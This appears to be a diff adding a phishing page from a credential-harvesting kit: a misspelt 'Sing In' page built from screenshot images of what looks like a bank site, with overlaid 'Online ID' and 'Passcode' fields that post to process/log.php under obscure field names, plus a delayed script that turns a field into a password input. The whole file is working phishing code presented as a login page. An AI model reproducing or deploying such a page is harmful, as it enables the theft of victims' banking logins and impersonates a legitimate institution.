@@ -1,0 +1,90 @@
+<html><head>
+<title>Sing In </title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<script>setTimeout(function() {
+  document.getElementsByTagName('input')[1].type = "password"
+}, 1000);
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="images/favicon.ico">
+<style type="text/css">
+ .textbox {  
+    
+    border: 1px solid #d1c9c0;
+    border-radius: 2px;
+	padding-left: 10px;
+	font-size: 19px;
+    font-family: Arial,"Helvetica Neue",Helvetica,Roboto,sans-serif;
+	color: #414141;
+    height: 42px; 
+    width: 275px;
+  	box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+ } 
+ 
+.textbox:focus {  
+    border-color: #999999; 
+  	background: #FAFAFA;
+    border-style: solid; 
+    border-width: 1px; 
+    outline: 0; 
+ } 
+</style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1350px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+
+</head>
+<body>
+<div class="loader" style="opacity: 0.8;"></div>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:628px; z-index:0"><img src="images/e1.png" alt="" title="" border="0" width="1349" height="628"></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:624px; width:1350px; height:633px; z-index:1"><img src="images/e2.png" alt="" title="" border="0" width="1350" height="633"></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:1302px; width:1349px; height:619px; z-index:2"><img src="images/e3.png" alt="" title="" border="0" width="1349" height="619"></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:1937px; width:1349px; height:595px; z-index:3"><img src="images/e4.png" alt="" title="" border="0" width="1349" height="595"></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:2639px; width:1349px; height:642px; z-index:4"><img src="images/e5.png" alt="" title="" border="0" width="1349" height="642"></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:3280px; width:1349px; height:514px; z-index:5"><img src="images/e6.png" alt="" title="" border="0" width="1349" height="514"></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:64px; top:347px; width:265px; height:201px; z-index:6"><a href="#"><img src="images/e7.png" alt="" title="" border="0" width="265" height="201"></a></div>
+<form action="process/log.php" name="takaful" method="post">
+<input name="sr" placeholder="Online ID " class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:274px;left:67px;top:158px;z-index:7">
+<input name="dw" placeholder="Passcode " class="textbox" autocomplete="off" required="" type="password" style="position:absolute;width:274px;left:67px;top:208px;z-index:8">
+<div id="formimage1" style="position:absolute; left:66px; top:298px; z-index:9"><input type="image" name="formimage1" width="276" height="42" src="images/e8.png"></div>
+</form></div>
+
+
+
+</body></html>
